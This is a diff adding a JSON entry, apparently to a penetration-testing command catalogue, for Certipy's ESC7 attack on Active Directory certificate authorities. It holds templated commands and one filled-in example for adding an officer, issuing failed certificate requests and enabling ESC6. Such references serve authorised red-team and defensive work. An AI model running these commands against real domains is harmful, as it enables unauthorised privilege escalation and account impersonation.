@@ -1,0 +1,20 @@
+{
+  "id": "certipy-esc7",
+  "name": "Certipy ESC7 (Vulnerable CA Access Rights)",
+  "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -add-officer '<user>'",
+  "description": "ESC7: you have ManageCA or ManageCertificates on the CA. Add yourself as an officer, approve a previously failed request, or issue a new cert. Also lets you flip CA flags such as EDITF_ATTRIBUTESUBJECTALTNAME2 to enable ESC6.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["rpc", "ldap"],
+  "tags": ["certipy", "adcs", "esc7", "manage-ca"],
+  "variations": [
+    { "label": "Issue Failed Request", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -issue-request <request-id>" },
+    { "label": "List Templates", "requires": "password", "command": "certipy ca -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -list-templates" }
+  ],
+  "references": [
+    { "title": "Certipy ESC7", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy ca -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -add-officer jdoe"
+  ]
+}
